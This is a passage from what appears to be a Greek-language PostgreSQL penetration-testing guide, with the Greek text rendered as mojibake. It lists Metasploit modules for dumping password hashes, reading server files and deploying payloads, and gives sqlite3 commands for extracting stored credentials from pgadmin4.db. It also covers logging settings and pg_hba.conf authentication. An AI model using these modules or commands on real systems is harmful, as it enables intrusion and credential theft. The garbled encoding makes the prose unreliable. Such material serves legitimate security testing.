7. _(Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬)_ ÎšÎ±Î¸Î±ÏÎ¯ÏƒÏ„Îµ Ï„Î· Î¼Î½Î®Î¼Î· cache Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± Î´Î±Ï€Î±Î½Î·ÏÎ® Î´Î®Î»Ï‰ÏƒÎ· SQL
8. Î ÏÎ­Ï€ÎµÎ¹ Ï„ÏÏÎ± Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ½ÏŒÏ‚ Ï€Î»Î®ÏÎ¿Ï…Ï‚ Ï…Ï€ÎµÏÎ´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®.
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ _**postgresql.conf**_ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î± logs Ï„Î¿Ï… postgresql Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, **ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚ Î³Î¹Î± Ï„Î¿ PostgreSQL.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ _**pgadmin4.db**_\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï…Ï‚ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± _**decrypt**_ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Î— Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÎµÎ»Î¬Ï„Î· ÏƒÏ„Î¿ PostgreSQL Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **pg\_hba.conf**. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÏƒÎµÎ¹ÏÎ¬ ÎµÎ³Î³ÏÎ±Ï†ÏÎ½, ÎºÎ±Î¸ÎµÎ¼Î¯Î± Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¿Ï€Î¿Î¯ÎµÏ‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„ÏÏ€Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚, ÎµÏÏÎ¿Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ IP Ï€ÎµÎ»Î¬Ï„Î· (ÎµÎ¬Î½ ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎ¹Î¼Î¿), ÏŒÎ½Î¿Î¼Î± Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Î¹ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½. Î— Ï€ÏÏÏ„Î· ÎµÎ³Î³ÏÎ±Ï†Î® Ï€Î¿Ï… Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹ Î¼Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚, Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… Ï€ÎµÎ»Î¬Ï„Î·, Ï„Î· Î¶Î·Ï„Î¿ÏÎ¼ÎµÎ½Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·. Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î»ÏÏƒÎ· Î® Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎµÎ¬Î½ Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ Î· Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·. Î•Î¬Î½ ÎºÎ±Î¼Î¯Î± ÎµÎ³Î³ÏÎ±Ï†Î® Î´ÎµÎ½ Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹, Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Ï€Î¿ÏÏÎ¯Ï€Ï„ÎµÏ„Î±Î¹.

ÎŸÎ¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÎµ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ pg\_hba.conf ÎµÎ¯Î½Î±Î¹ **md5**, **crypt** ÎºÎ±Î¹ **password**. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ ÏƒÏ„Î¿Î½ Ï„ÏÏŒÏ€Î¿ Î¼Îµ Ï„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¼ÎµÏ„Î±Î´Î¯Î´ÎµÏ„Î±Î¹ Î¿ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚: Î¼Îµ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· MD5, ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î¼Îµ crypt Î® ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î£Î·Î¼Î±Î½Ï„Î¹ÎºÏŒ ÎµÎ¯Î½Î±Î¹ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ crypt Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ ÏƒÏ„Î¿ pg\_authid.
